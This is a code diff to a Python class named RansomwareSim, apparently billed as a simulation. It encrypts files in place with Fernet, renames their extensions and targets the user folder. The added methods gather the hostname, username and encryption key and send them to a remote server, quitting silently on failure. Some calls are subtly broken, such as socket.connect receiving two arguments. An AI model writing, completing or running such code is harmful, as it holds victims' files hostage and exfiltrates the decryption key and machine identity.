@@ -1,5 +1,6 @@
 import socket
 import os
+import json
 from cryptography.fernet import Fernet
 
 class RansomwareSim:
@@ -17,7 +18,7 @@ class RansomwareSim:
             original = file.read()
         encrypted_data = f.encrypt(original)
 
-        encrypted_path = file_path + ".mocklock"
+        encrypted_path = file_path + ".simcrypt"
         with open(file_path, "wb") as file:
             file.write(encrypted_data)
 
@@ -40,11 +41,26 @@ class RansomwareSim:
                     encrypted_file_path = self.encrypt_file(file_path)
                     encrypted_files.append(encrypted_file_path)
         return encrypted_files
+    
+    def get_data(self):
+        return {
+            'device_name': socket.gethostname(),
+            'key': self.key.decode(),
+            'username': self.get_username()
+        }
+    
+    def send_data(self):
+        data = self.get_data()
+        self.send_to_server(json.dumps(data))
                 
-    def server_connect(self):
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.connect(self.host, self.port)
-        server_socket.sendall()
+    def send_to_server(self, data):
+        
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect(self.host, self.port)
+                s.sendall(data)
+        except:
+            quit(0)
 
 def main():
     # define directory, want to target user folder
